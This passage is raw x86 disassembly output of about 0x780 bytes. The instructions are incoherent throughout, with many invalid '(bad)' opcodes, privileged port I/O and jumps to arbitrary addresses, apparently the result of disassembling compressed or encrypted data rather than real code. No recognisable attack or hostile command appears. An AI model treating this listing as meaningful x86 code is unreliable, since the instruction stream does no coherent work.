  41d254:	rol    DWORD PTR [ebp+0xe],cl
  41d257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d258:	and    BYTE PTR ds:0x48de6588,0xb9
  41d25f:	mov    edx,0x3b5d428f
  41d264:	inc    ecx
  41d265:	loopne 0x41d2ae
  41d267:	and    ebp,DWORD PTR [edx+0x6ec3df91]
  41d26d:	or     eax,0x386a1f83
  41d272:	inc    eax
  41d273:	(bad)  
  41d274:	xchg   esp,eax
  41d275:	push   edx
  41d276:	in     al,dx
  41d277:	dec    ecx
  41d278:	repz pushf 
  41d27a:	xor    eax,0xd73859e3
  41d27f:	push   edi
  41d280:	mov    DWORD PTR [eax],edi
  41d282:	outs   dx,DWORD PTR ds:[esi]
  41d283:	and    BYTE PTR [eax],bh
  41d285:	fcomp  DWORD PTR [ebx-0x45a15286]
  41d28b:	dec    eax
  41d28c:	xchg   edi,eax
  41d28d:	imul   edi,esp,0xc89db49e
  41d293:	dec    edi
  41d294:	clc    
  41d295:	je     0x41d251
  41d297:	pusha  
  41d298:	push   0x726feab8
  41d29d:	pop    edx
  41d29e:	dec    esp
  41d29f:	or     ebp,DWORD PTR [edx]
  41d2a1:	or     ebp,DWORD PTR [ecx+0x43b9fd50]
  41d2a7:	mov    eax,0xc8cf2f84
  41d2ac:	fiadd  WORD PTR [esi]
  41d2ae:	adc    bl,dh
  41d2b0:	push   es
  41d2b1:	jo     0x41d256
  41d2b3:	push   0x4ccf64da
  41d2b8:	push   eax
  41d2b9:	and    ecx,DWORD PTR [ebx+0x523c7cdf]
  41d2bf:	leave  
  41d2c0:	and    bl,BYTE PTR [edi+0x7b]
  41d2c3:	mov    ecx,0x5b76e303
  41d2c8:	push   eax
  41d2c9:	(bad)  
  41d2ca:	aam    0x43
  41d2cc:	loopne 0x41d254
  41d2ce:	out    0x77,eax
  41d2d0:	push   es
  41d2d1:	adc    esp,eax
  41d2d3:	loopne 0x41d2a6
  41d2d5:	or     ebx,DWORD PTR [ebp+0x2a4daca2]
  41d2db:	jae    0x41d2fa
  41d2dd:	push   ebp
  41d2de:	mov    esi,0x142dff05
  41d2e3:	(bad)  
  41d2e4:	dec    edi
  41d2e5:	cdq    
  41d2e6:	in     eax,dx
  41d2e7:	(bad)  
  41d2e8:	push   0xffffffe3
  41d2ea:	sbb    al,0xa7
  41d2ec:	mov    cl,BYTE PTR [esp+ebx*8]
  41d2ef:	jo     0x41d2cf
  41d2f1:	xor    al,0x1a
  41d2f3:	icebp  
  41d2f4:	idiv   BYTE PTR [eax]
  41d2f6:	ins    DWORD PTR es:[edi],dx
  41d2f7:	ja     0x41d342
  41d2f9:	xchg   ebx,eax
  41d2fa:	mov    edx,0xbbde6782
  41d2ff:	jbe    0x41d2a5
  41d301:	dec    ebp
  41d302:	adc    esp,DWORD PTR [esi-0x3307866e]
  41d308:	jb     0x41d360
  41d30a:	loop   0x41d322
  41d30c:	and    edi,ecx
  41d30e:	add    dh,0xea
  41d311:	mov    dl,0x3f
  41d313:	cwde   
  41d314:	ins    DWORD PTR es:[edi],dx
  41d315:	inc    esp
  41d316:	pop    edi
  41d317:	outs   dx,DWORD PTR ds:[esi]
  41d318:	popf   
  41d319:	or     dl,BYTE PTR [edx]
  41d31b:	pop    esi
  41d31c:	les    edx,FWORD PTR [eax-0x26fbc401]
  41d322:	dec    esi
  41d323:	push   edx
  41d324:	jge    0x41d379
  41d326:	cmc    
  41d327:	div    BYTE PTR [esi+eax*1+0x10]
  41d32b:	add    al,0x89
  41d32d:	(bad)  
  41d32e:	sti    
  41d32f:	(bad)  
  41d330:	cmc    
  41d331:	mov    al,0xa5
  41d333:	pushf  
  41d334:	dec    DWORD PTR ds:0x866b6da0
  41d33a:	test   edx,ecx
  41d33c:	xchg   BYTE PTR [ebp-0x2af7c95d],al
  41d342:	push   esi
  41d343:	mov    esi,edx
  41d345:	sbb    DWORD PTR [esi-0x71a696df],esi
  41d34b:	pop    eax
  41d34c:	pop    ss
  41d34d:	int    0xc1
  41d34f:	cld    
  41d350:	cmc    
  41d351:	xor    BYTE PTR [edi],dl
  41d353:	push   0x1955f103
  41d358:	or     ch,BYTE PTR ds:0xdc5a6725
  41d35e:	xor    eax,0xe38e1464
  41d363:	pop    es
  41d364:	cli    
  41d365:	clc    
  41d366:	into   
  41d367:	sar    BYTE PTR [edi+0x1],1
  41d36a:	data16 fsub DWORD PTR ds:0xeb7754dc
  41d371:	and    eax,0xf2a15821
  41d376:	in     eax,dx
  41d377:	add    DWORD PTR [ecx],ebx
  41d379:	js     0x41d2fd
  41d37b:	mov    eax,ds:0x191fb299
  41d380:	xor    ebp,DWORD PTR [ecx-0x658b5700]
  41d386:	jmp    0x42f3:0x1906722f
  41d38d:	jmp    0x27459577
  41d392:	hlt    
  41d393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d394:	pop    es
  41d395:	mov    dh,0x15
  41d397:	lea    edi,[ebp+0x6f]
  41d39a:	inc    ebx
  41d39b:	idiv   BYTE PTR [ebx+eax*2]
  41d39e:	scas   al,BYTE PTR es:[edi]
  41d39f:	or     dh,BYTE PTR [edx+0x135ea1fa]
  41d3a5:	sbb    edx,edx
  41d3a7:	dec    edx
  41d3a8:	push   es
  41d3a9:	icebp  
  41d3aa:	mov    ds:0x706873c3,al
  41d3af:	inc    esp
  41d3b0:	(bad)  
  41d3b1:	mov    ebx,0xd8f9aff0
  41d3b6:	retf   
  41d3b7:	ins    DWORD PTR es:[edi],dx
  41d3b8:	mov    dh,BYTE PTR ds:[edi]
  41d3bb:	mov    ds:0x9e15e3d,al
  41d3c0:	jmp    0x5a2a045c
  41d3c5:	dec    esi
  41d3c6:	sti    
  41d3c7:	fnsetpm(287 only) 
  41d3c9:	enter  0x9232,0xba
  41d3cd:	xchg   esp,eax
  41d3ce:	nop
  41d3cf:	setp   BYTE PTR [eax+edx*1]
  41d3d3:	(bad)  
  41d3d4:	pop    eax
  41d3d5:	aad    0xd9
  41d3d7:	xchg   edx,eax
  41d3d8:	imul   edi,ecx,0xffffffb8
  41d3db:	ret    0xa361
  41d3de:	or     al,0xba
  41d3e1:	nop
  41d3e2:	mov    bh,0xc6
  41d3e4:	mov    dh,0xc4
  41d3e6:	jns    0x41d3c4
  41d3e8:	jg     0x41d453
  41d3ea:	call   0xf5f6:0x9fa4f47c
  41d3f1:	test   al,0x60
  41d3f3:	fwait
  41d3f4:	pusha  
  41d3f5:	mov    ds:0x639c4eca,eax
  41d3fa:	(bad)  
  41d3fb:	rcr    DWORD PTR [esi],0x5d
  41d3fe:	xchg   BYTE PTR [ebp+0x67f6dd5b],ah
  41d404:	mov    ds:0xb6308726,al
  41d409:	mov    edx,0x2cdcfca3
  41d40e:	dec    esp
  41d40f:	xchg   DWORD PTR [ebp-0x7b],edi
  41d412:	mov    DWORD PTR [esi-0x8],esi
  41d415:	xor    ebx,esp
  41d417:	jo     0x41d488
  41d419:	dec    edx
  41d41a:	enter  0xafee,0xbd
  41d41e:	data16 mov al,0xbd
  41d421:	jns    0x41d499
  41d423:	push   eax
  41d424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d425:	or     ebp,ebp
  41d427:	jnp    0x41d45f
  41d429:	fstp   TBYTE PTR [edi-0x3afeab9a]
  41d42f:	dec    ebp
  41d430:	cld    
  41d431:	add    BYTE PTR [esi+0x6d],dh
  41d434:	adc    eax,eax
  41d436:	lea    edx,[eax+ebx*4]
  41d439:	js     0x41d486
  41d43b:	icebp  
  41d43c:	inc    esp
  41d43d:	stos   BYTE PTR es:[edi],al
  41d43e:	mov    fs:0x9418dcc,eax
  41d444:	jle    0x41d45d
  41d446:	das    
  41d447:	outs   dx,BYTE PTR ds:[esi]
  41d448:	add    cl,BYTE PTR [ebx]
  41d44a:	jae    0x41d42f
  41d44c:	mov    esi,0xb7f92f7b
  41d451:	call   0xb41c:0x49e89d2b
  41d458:	(bad)  
  41d459:	sub    BYTE PTR [eax+0xff4065e],0x10
  41d460:	push   0x24
  41d462:	ss adc dh,cl
  41d465:	sar    ebp,cl
  41d467:	inc    ecx
  41d468:	scas   eax,DWORD PTR es:[edi]
  41d469:	add    eax,DWORD PTR [ebx+edx*1-0x2d6fed88]
  41d470:	sbb    BYTE PTR [ebx-0x6a],bh
  41d473:	xchg   cl,dl
  41d475:	lea    esi,[eax]
  41d477:	jle    0x41d40e
  41d479:	cwde   
  41d47a:	repnz and eax,0x345fa788
  41d480:	jle    0x41d41b
  41d482:	or     ecx,DWORD PTR [edi+0x71f6b4a8]
  41d488:	or     BYTE PTR [eax-0x23],al
  41d48b:	mov    bl,0xec
  41d48d:	in     eax,0x6e
  41d48f:	and    BYTE PTR [eax],cl
  41d491:	jl     0x41d50e
  41d493:	pusha  
  41d494:	shr    ch,1
  41d496:	xchg   edx,eax
  41d497:	(bad)
  41d49c:	sti    
  41d49d:	pop    es
  41d49e:	sub    eax,ecx
  41d4a0:	lock mov ss,WORD PTR [ecx]
  41d4a3:	out    0x97,eax
  41d4a5:	cmp    esi,ecx
  41d4a7:	cmc    
  41d4a8:	rcr    DWORD PTR [ebp-0x4d],0xc6
  41d4ac:	ret    0xc94c
  41d4af:	xchg   BYTE PTR [edx+0x70811d40],dh
  41d4b5:	mov    ds:0xcd9235db,eax
  41d4ba:	jl     0x41d4ef
  41d4bc:	xchg   ebx,eax
  41d4bd:	or     al,0x73
  41d4bf:	std    
  41d4c0:	fld    QWORD PTR [ecx]
  41d4c2:	mov    al,0xbc
  41d4c4:	xchg   ch,ch
  41d4c6:	std    
  41d4c7:	add    bl,BYTE PTR ds:0x728a66b8
  41d4cd:	outs   dx,DWORD PTR ds:[esi]
  41d4ce:	xor    dl,BYTE PTR [esi+0x2a55a33c]
  41d4d4:	mov    eax,0xea10496
  41d4d9:	dec    edx
  41d4da:	mov    ds:0xa69356c9,al
  41d4df:	test   eax,0x1f2dde42
  41d4e4:	ror    DWORD PTR [ebx-0x3be7f1b4],0xf3
  41d4eb:	or     ebp,DWORD PTR [edx+0x150fa984]
  41d4f1:	sub    ch,BYTE PTR [esi+0x3c]
  41d4f4:	out    0xc8,eax
  41d4f6:	in     al,dx
  41d4f7:	add    ah,ah
  41d4f9:	mov    al,0xed
  41d4fb:	cld    
  41d4fc:	cmp    cl,bl
  41d4fe:	xchg   ecx,eax
  41d4ff:	sub    eax,0x97a09f0f
  41d504:	aad    0xd9
  41d506:	outs   dx,DWORD PTR ds:[esi]
  41d507:	leave  
  41d508:	add    al,0x6d
  41d50a:	cli    
  41d50b:	sub    edi,DWORD PTR [esp+eax*4]
  41d50e:	xchg   edx,eax
  41d50f:	push   0x77
  41d511:	cmc    
  41d512:	enter  0x49c4,0x8d
  41d516:	retf   0xf3e8
  41d519:	(bad)  
  41d51a:	repnz mov al,0x0
  41d51d:	hlt    
  41d51e:	xchg   ebp,eax
  41d51f:	imul   ecx,esi,0xdcd85b1d
  41d525:	push   ebp
  41d526:	(bad)  
  41d528:	sahf   
  41d529:	adc    al,BYTE PTR [ebx]
  41d52b:	jle    0x41d4f4
  41d52d:	outs   dx,DWORD PTR ds:[esi]
  41d52e:	xchg   esi,eax
  41d52f:	loopne 0x41d4e5
  41d531:	mov    ch,0x1c
  41d533:	jnp    0x41d5ac
  41d535:	adc    al,BYTE PTR [edx-0x11]
  41d538:	jmp    FWORD PTR [edi+0x51935929]
  41d53e:	cmp    eax,0x23ae4feb
  41d543:	aaa    
  41d544:	or     ah,BYTE PTR [eax-0x63]
  41d547:	cld    
  41d548:	dec    ebp
  41d549:	call   FWORD PTR [edi+0x4f]
  41d54c:	mov    al,0xe3
  41d54e:	arpl   WORD PTR [ecx-0x1864d378],si
  41d554:	mov    ds:0x6096f28a,al
  41d559:	(bad)
  41d55c:	xchg   esi,eax
  41d55d:	mov    dh,0xb3
  41d55f:	cmp    edi,0xa43798fd
  41d565:	inc    ebx
  41d566:	xchg   edi,eax
  41d567:	sbb    eax,0xd7c591cb
  41d56c:	push   ds
  41d56d:	mov    al,BYTE PTR [ecx+0x5d193d2f]
  41d573:	or     al,0xe4
  41d575:	pop    esp
  41d576:	out    dx,al
  41d577:	ins    BYTE PTR es:[edi],dx
  41d578:	sahf   
  41d579:	jmp    0x1091:0x6c1a1567
  41d580:	pushf  
  41d581:	jp     0x41d522
  41d583:	les    esp,FWORD PTR [eax]
  41d585:	popf   
  41d586:	lods   eax,DWORD PTR ds:[esi]
  41d587:	mov    DWORD PTR [eax],eax
  41d589:	lea    ebp,[ecx+0x6f2781ab]
  41d58f:	inc    edi
  41d590:	stc    
  41d591:	mov    es,ebp
  41d593:	mov    eax,ds:0x62aa262a
  41d598:	iret   
  41d599:	rsqrtps xmm3,XMMWORD PTR [eax-0x230ca900]
  41d5a0:	rol    eax,0x23
  41d5a3:	or     al,0x1c
  41d5a5:	sub    eax,0xa13d9735
  41d5aa:	cmp    BYTE PTR [edx+0x6594b53],cl
  41d5b0:	sub    esi,DWORD PTR [esi]
  41d5b2:	mov    esi,0x4022d468
  41d5b7:	and    dl,BYTE PTR [eax-0x18464058]
  41d5bd:	adc    ecx,DWORD PTR [edx]
  41d5bf:	(bad)  
  41d5c0:	popf   
  41d5c1:	dec    eax
  41d5c2:	or     al,0xf9
  41d5c4:	pop    edi
  41d5c5:	xchg   ebx,eax
  41d5c6:	dec    ebx
  41d5c7:	es addr16 inc ebx
  41d5ca:	jmp    DWORD PTR [edx-0x2b5dd2f2]
  41d5d0:	mov    bh,0x3f
  41d5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d3:	ficomp WORD PTR [edi+ecx*2-0x34ad7b36]
  41d5da:	or     DWORD PTR [ecx],edx
  41d5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5dd:	xchg   ebx,eax
  41d5de:	mov    edx,0xd4767264
  41d5e3:	sub    ebp,DWORD PTR [edx]
  41d5e5:	mov    esp,DWORD PTR [esi-0x716414b1]
  41d5eb:	clc    
  41d5ec:	gs retf 
  41d5ee:	cld    
  41d5ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5f0:	xor    ebx,DWORD PTR ds:0x9c31ee4d
  41d5f6:	jmp    0x41d629
  41d5f8:	shl    DWORD PTR [ebp-0x51fcb37e],cl
  41d5fe:	rol    BYTE PTR [edx-0xe],cl
  41d601:	fistp  DWORD PTR [ecx]
  41d603:	sar    DWORD PTR [ecx],0xb4
  41d606:	xchg   ebx,eax
  41d607:	dec    eax
  41d608:	repz add al,0xe5
  41d60b:	sar    BYTE PTR [esi+0x2e8b2552],1
  41d611:	cs dec edi
  41d613:	xlat   BYTE PTR ds:[ebx]
  41d614:	mov    ch,0x39
  41d616:	out    dx,al
  41d617:	sar    BYTE PTR [ecx],0x6c
  41d61a:	sbb    eax,0xa6faa558
  41d61f:	inc    ebp
  41d620:	dec    edx
  41d621:	ret    0x4792
  41d624:	mov    dl,0x1c
  41d626:	add    BYTE PTR [esp+eiz*2],al
  41d629:	inc    edx
  41d62a:	scas   al,BYTE PTR es:[edi]
  41d62b:	lods   eax,DWORD PTR ds:[esi]
  41d62c:	adc    eax,0xab5a39b8
  41d631:	loop   0x41d5f2
  41d633:	pushf  
  41d634:	mov    esp,0xe6e1d52a
  41d639:	jns    0x41d681
  41d63b:	in     eax,dx
  41d63c:	push   esi
  41d63d:	mov    ds:0xc839bf40,eax
  41d642:	pop    eax
  41d643:	std    
  41d644:	or     DWORD PTR [ebx-0xf],ebp
  41d647:	js     0x41d642
  41d649:	ret    
  41d64a:	dec    ebx
  41d64b:	pop    es
  41d64c:	mov    bl,0xda
  41d64e:	ins    DWORD PTR es:[edi],dx
  41d64f:	push   eax
  41d650:	jecxz  0x41d6b4
  41d652:	test   eax,0x4a6f6579
  41d657:	adc    DWORD PTR [ecx],edi
  41d659:	xchg   ebp,eax
  41d65a:	add    eax,0x18108dad
  41d65f:	dec    edi
  41d660:	pop    es
  41d661:	mov    ah,0x4c
  41d663:	xchg   edx,eax
  41d664:	mov    dh,0x79
  41d666:	sub    BYTE PTR [ebp+0xa77c149],bl
  41d66c:	mov    ds:0xf3a3b1e,eax
  41d671:	into   
  41d672:	(bad)  
  41d673:	mov    eax,0x406bffce
  41d678:	mov    edi,0xae920975
  41d67d:	(bad)  
  41d67e:	push   edi
  41d67f:	aam    0xe5
  41d681:	mov    dh,0xd0
  41d683:	ret    0xdaea
  41d686:	mov    ah,BYTE PTR [ebp+0x20f31b41]
  41d68c:	and    cl,BYTE PTR [edx-0x4109356]
  41d692:	mov    al,0xb4
  41d694:	cmc    
  41d695:	cmp    ecx,esp
  41d697:	(bad)  
  41d698:	or     DWORD PTR [ecx+esi*4+0x3f],esi
  41d69c:	sti    
  41d69d:	xchg   esp,eax
  41d69e:	add    eax,0x6dfbc1cc
  41d6a3:	jge    0x41d66e
  41d6a5:	adc    ecx,0xffffffb4
  41d6a8:	pop    edx
  41d6a9:	in     eax,dx
  41d6aa:	add    dh,ah
  41d6ac:	call   0x90bd6ae4
  41d6b1:	push   cs
  41d6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6b3:	jns    0x41d70f
  41d6b5:	cli    
  41d6b6:	jns    0x41d6d0
  41d6b8:	pusha  
  41d6b9:	jbe    0x41d672
  41d6bb:	std    
  41d6bc:	ja     0x41d6c9
  41d6be:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6c0:	mov    ebp,0x72365723
  41d6c5:	jbe    0x41d709
  41d6c7:	add    edx,ecx
  41d6c9:	or     bl,bl
  41d6cb:	sti    
  41d6cc:	inc    esi
  41d6cd:	arpl   WORD PTR [ebx+ebp*4-0x2edd17ce],cx
  41d6d4:	sub    ebx,DWORD PTR [edx-0x50f4debc]
  41d6da:	retf   0x9759
  41d6dd:	push   ds
  41d6de:	xlat   BYTE PTR ds:[ebx]
  41d6df:	call   0x5760:0xf5143e47
  41d6e6:	ficom  DWORD PTR [esi+0x53cf200e]
  41d6ec:	mov    bl,0xa8
  41d6ee:	inc    eax
  41d6ef:	sbb    BYTE PTR ds:0x8534ceab,dh
  41d6f5:	(bad)  
  41d6f8:	rcl    BYTE PTR [edx],1
  41d6fa:	dec    ebp
  41d6fb:	sahf   
  41d6fc:	das    
  41d6fd:	jb     0x41d6d1
  41d6ff:	fld    DWORD PTR [esi]
  41d701:	sbb    bh,dh
  41d703:	data16 es mov dl,0xc8
  41d707:	jge    0x41d6e3
  41d709:	out    dx,eax
  41d70a:	popa   
  41d70b:	add    eax,0x821de2c9
  41d710:	mov    eax,ds:0x6e31fcc9
  41d715:	int3   
  41d716:	mov    ds:0xf0b1d0,eax
  41d71b:	dec    ebx
  41d71c:	sahf   
  41d71d:	jge    0x41d6bf
  41d71f:	inc    ebp
  41d720:	mov    gs:0xae6ff8c9,al
  41d726:	or     cl,ah
  41d728:	stos   DWORD PTR es:[edi],eax
  41d729:	jo     0x41d6f1
  41d72b:	retf   0x699e
  41d72e:	sahf   
  41d72f:	(bad)  
  41d730:	xlat   BYTE PTR ds:[ebx]
  41d731:	or     cl,al
  41d733:	pushf  
  41d734:	nop
  41d735:	aas    
  41d736:	mov    dl,0xf4
  41d738:	adc    edi,DWORD PTR ds:0x1ab642da
  41d73e:	dec    ebp
  41d73f:	dec    BYTE PTR [ebp+0x205da514]
  41d745:	popf   
  41d746:	push   cs
  41d747:	mov    ecx,DWORD PTR [eax+0x64]
  41d74a:	retf   
  41d74b:	push   0xc5f59c47
  41d750:	mov    ds:0x333bf17e,eax
  41d755:	outs   dx,DWORD PTR ds:[esi]
  41d756:	loop   0x41d788
  41d758:	mov    cl,BYTE PTR [edi+0x7c]
  41d75b:	arpl   WORD PTR [ecx+0x1e],si
  41d75e:	arpl   bp,ax
  41d760:	js     0x41d737
  41d762:	mov    edi,DWORD PTR ds:0xb80ee874
  41d768:	jne    0x41d716
  41d76a:	lods   eax,DWORD PTR ds:[esi]
  41d76b:	ret    0xc8ae
  41d76e:	mov    ds:0x54100ed5,al
  41d773:	push   esp
  41d774:	mov    bh,0x72
  41d776:	test   eax,0x4da64349
  41d77b:	int3   
  41d77c:	jo     0x41d793
  41d77e:	js     0x41d7e0
  41d780:	cmc    
  41d781:	add    esp,DWORD PTR [eax-0x6cb6703c]
  41d787:	inc    edi
  41d788:	cmc    
  41d789:	jge    0x41d7ad
  41d78b:	repnz cwde 
  41d78d:	sbb    eax,0x39b6c76f
  41d792:	test   ah,0x1e
  41d795:	pop    es
  41d796:	jl     0x41d812
  41d798:	aas    
  41d799:	ret    
  41d79a:	pop    ss
  41d79b:	fnstsw WORD PTR [esi-0x7]
  41d79e:	jne    0x41d735
  41d7a0:	mov    esi,0xc3cab9
  41d7a5:	scas   al,BYTE PTR es:[edi]
  41d7a6:	stos   BYTE PTR es:[edi],al
  41d7a7:	mov    ecx,0x23a64788
  41d7ac:	jge    0x41d7e7
  41d7ae:	pop    edi
  41d7af:	std    
  41d7b0:	push   esp
  41d7b1:	mov    ds:0xa57fb3fc,eax
  41d7b6:	test   ch,bl
  41d7b8:	jne    0x41d760
  41d7ba:	xor    al,0x75
  41d7bc:	pop    ebx
  41d7bd:	out    0x9b,al
  41d7bf:	mov    ecx,0xa0466b29
  41d7c4:	cs pop esi
  41d7c6:	aad    0x3
  41d7c8:	mov    DWORD PTR [esi+0x4694d43d],esi
  41d7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7cf:	lods   al,BYTE PTR ds:[esi]
  41d7d0:	xchg   esp,eax
  41d7d1:	xchg   edx,eax
  41d7d2:	pop    ecx
  41d7d3:	in     al,0x55
  41d7d5:	mov    dl,al
  41d7d7:	jno    0x41d82c
  41d7d9:	call   0xb23dc81e
  41d7de:	shl    DWORD PTR [ecx],0x73
  41d7e1:	sbb    esp,0xae5de73d
  41d7e7:	add    BYTE PTR [edx+edi*8-0xff32488],al
  41d7ee:	ret    0x649e
  41d7f1:	sbb    DWORD PTR [ebp-0x43],edi
  41d7f4:	das    
  41d7f5:	sbb    al,al
  41d7f7:	add    cl,BYTE PTR [edi+ecx*1-0x9]
  41d7fb:	jle    0x41d871
  41d7fd:	inc    edi
  41d7fe:	or     BYTE PTR [ebx],0xb1
  41d801:	lahf   
  41d802:	shl    bh,cl
  41d804:	outs   dx,DWORD PTR ds:[esi]
  41d805:	in     eax,dx
  41d806:	shl    BYTE PTR [ecx-0x2c],cl
  41d809:	aad    0xb6
  41d80b:	sbb    dl,BYTE PTR [esi+0x4cc419db]
  41d811:	jmp    0x41d7c2
  41d813:	pushf  
  41d814:	push   esp
  41d815:	(bad)  
  41d817:	or     edx,DWORD PTR [edi]
  41d819:	mov    ebp,edx
  41d81b:	pop    ecx
  41d81c:	add    al,0xc9
  41d81e:	(bad)  
  41d81f:	push   ebp
  41d820:	inc    ebp
  41d821:	mov    esi,0xe9e4d9ef
  41d826:	sub    al,0x40
  41d828:	retf   
  41d829:	(bad)  
  41d82a:	rcr    DWORD PTR [esi+esi*4+0x4866bd06],cl
  41d831:	and    al,0x90
  41d833:	push   ecx
  41d834:	idiv   DWORD PTR [edx-0x7a]
  41d837:	loop   0x41d87b
  41d839:	or     BYTE PTR [eax],0xf4
  41d83c:	popf   
  41d83d:	sbb    ecx,DWORD PTR [esi]
  41d83f:	xchg   ecx,eax
  41d840:	push   esi
  41d841:	shr    DWORD PTR [esi-0x22c104b2],cl
  41d847:	mov    eax,0xc4a426f1
  41d84c:	loop   0x41d883
  41d84e:	test   DWORD PTR [esi+0x27868901],0x189d1521
  41d858:	push   ebx
  41d859:	xchg   ebp,eax
  41d85a:	sub    ah,BYTE PTR [eax]
  41d85c:	inc    esi
  41d85d:	nop
  41d85e:	jmp    0x26986d56
  41d863:	add    al,0x90
  41d865:	jl     0x41d817
  41d867:	imul   edx,DWORD PTR [edi+edx*8],0x1da056d3
  41d86e:	add    al,BYTE PTR [ebp+0x11a94b90]
  41d874:	pop    edx
  41d875:	push   ecx
  41d876:	arpl   WORD PTR [ecx-0x52],di
  41d879:	push   edi
  41d87a:	pop    edi
  41d87b:	inc    esp
  41d87c:	sub    eax,0x5c506997
  41d881:	or     ah,BYTE PTR [edi+ecx*1+0x23]
  41d885:	xor    BYTE PTR [esi],dh
  41d887:	jae    0x41d8b5
  41d889:	sbb    edi,eax
  41d88b:	stos   DWORD PTR es:[edi],eax
  41d88c:	mov    ch,0xc
  41d88e:	jg     0x41d899
  41d890:	mov    esp,0x2dd95814
  41d895:	cmp    al,0x1e
  41d897:	leave  
  41d898:	(bad)  
  41d899:	in     eax,0x15
  41d89b:	cli    
  41d89c:	mov    cs,WORD PTR [esi*1-0x24c3d49b]
  41d8a3:	cmp    al,0xf0
  41d8a5:	add    BYTE PTR [edx],al
  41d8a7:	adc    ebp,DWORD PTR [edi]
  41d8a9:	mov    esi,0x88a48e90
  41d8ae:	jno    0x41d8b8
  41d8b0:	js     0x41d8b9
  41d8b2:	pop    es
  41d8b3:	mov    edx,0xa400128f
  41d8b8:	out    dx,eax
  41d8b9:	mov    esi,0xddd322bc
  41d8be:	les    esi,FWORD PTR [eax+ebp*4+0x2e]
  41d8c2:	and    al,0xb
  41d8c4:	aaa    
  41d8c5:	mov    edx,0x152ea999
  41d8ca:	jbe    0x41d8cc
  41d8cc:	pop    eax
  41d8cd:	rcl    ah,0x5
  41d8d0:	int3   
  41d8d1:	int3   
  41d8d2:	inc    edi
  41d8d3:	cs (bad) 
  41d8d5:	cld    
  41d8d6:	stos   DWORD PTR es:[edi],eax
  41d8d7:	cwde   
  41d8d8:	into   
  41d8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8da:	adc    BYTE PTR cs:[ebp-0x71],bh
  41d8de:	mov    cl,0x90
  41d8e0:	or     eax,0xcf54b242
  41d8e5:	mov    BYTE PTR [ecx],bh
  41d8e7:	xchg   esi,eax
  41d8e8:	dec    edx
  41d8e9:	xlat   BYTE PTR ds:[ebx]
  41d8ea:	retf   
  41d8eb:	jne    0x41d90e
  41d8ed:	pop    es
  41d8ee:	js     0x41d927
  41d8f0:	imul   esi,ecx,0x31
  41d8f3:	test   BYTE PTR [ebp-0x6ff17eec],dh
  41d8f9:	xchg   ebp,eax
  41d8fa:	inc    ecx
  41d8fb:	mov    ds:0xb3a77056,eax
  41d900:	out    dx,al
  41d901:	es xchg ebx,eax
  41d903:	(bad)  
  41d904:	jno    0x41d908
  41d906:	loopne 0x41d89e
  41d908:	(bad)  
  41d909:	and    al,0x48
  41d90b:	push   edx
  41d90c:	ret    
  41d90d:	scas   eax,DWORD PTR es:[edi]
  41d90e:	pop    ebp
  41d90f:	nop
  41d910:	rcl    BYTE PTR [edx],cl
  41d912:	fist   WORD PTR [ecx-0xf]
  41d915:	jae    0x41d8c4
  41d917:	mov    ebp,0x1251db73
  41d91c:	fstp   TBYTE PTR [ebx+eax*8]
  41d91f:	(bad)  
  41d921:	dec    ebx
  41d922:	repz pop ebp
  41d924:	pop    ebp
  41d925:	cmp    al,0x9f
  41d927:	test   al,0x9f
  41d929:	sahf   
  41d92a:	or     BYTE PTR [ecx+edx*1-0x5d],dh
  41d92e:	jmp    0x41d965
  41d930:	mov    al,ds:0x2dff699d
  41d935:	in     al,0x16
  41d937:	or     eax,0x17a181ea
  41d93c:	lds    edx,FWORD PTR [ebx+0x3bf22e63]
  41d942:	sub    dl,BYTE PTR [ebp+0x6ec626f9]
  41d948:	in     eax,0xe7
  41d94a:	sahf   
  41d94b:	adc    eax,0xb45c12a5
  41d950:	mov    ebp,0x84778a7
  41d955:	dec    eax
  41d956:	fisub  DWORD PTR [ebx+0x5c]
  41d959:	mov    edi,0x72fdbe3
  41d95e:	popf   
  41d95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d960:	push   ecx
  41d961:	sar    DWORD PTR [ecx-0x73],1
  41d964:	push   esi
  41d965:	adc    al,0x70
  41d967:	in     al,dx
  41d968:	mov    ah,ch
  41d96a:	or     ebx,DWORD PTR [ebx+ebx*8-0x27]
  41d96e:	addr16 cwde 
  41d970:	push   ecx
  41d971:	or     esp,ecx
  41d973:	(bad)  [esi+eiz*1-0x3843bc19]
  41d97a:	or     BYTE PTR [eax],bl
  41d97c:	clc    
  41d97d:	adc    bl,BYTE PTR [ecx-0x241589b6]
  41d983:	sub    al,0xff
  41d985:	stos   BYTE PTR es:[edi],al
  41d986:	push   es
  41d987:	inc    edi
  41d988:	out    0xf8,eax
  41d98a:	xor    DWORD PTR [ecx+ecx*2-0x575dba5],esp
  41d991:	loope  0x41d99d
  41d993:	mov    al,ds:0xf4132d7e
  41d998:	sahf   
  41d999:	jle    0x41d977
  41d99b:	or     al,0x91
  41d99d:	popa   
  41d99e:	adc    DWORD PTR [ecx-0x20],ebp
  41d9a1:	cld    
  41d9a2:	inc    edx
  41d9a3:	xor    DWORD PTR [ebp-0x1e],edi
  41d9a6:	jbe    0x41d9a4
  41d9a8:	bnd je 0x41d966
  41d9ab:	shl    al,cl
  41d9ad:	mov    ds:0x9d8f704d,eax
  41d9b2:	push   ebp
  41d9b3:	mov    edx,0x8f7a129e
  41d9b8:	sbb    cl,BYTE PTR [ecx-0xe]
  41d9bb:	daa    
  41d9bc:	mov    ebp,0xa79dbdf2
  41d9c1:	ret    0x65fa
  41d9c4:	xchg   DWORD PTR [ebx*1-0xb1e0986],edx
  41d9cb:	hlt    
  41d9cc:	adc    DWORD PTR [eax+0x27],ebp
  41d9cf:	clc    
  41d9d0:	adc    ebx,DWORD PTR [eax+0x49]
  41d9d3:	dec    ebx
  41d9d4:	shl    BYTE PTR [esi],1
  41d9d6:	sub    al,0xf9
  41d9d8:	inc    ebx
  41d9d9:	mov    ebp,0x1c4442f7
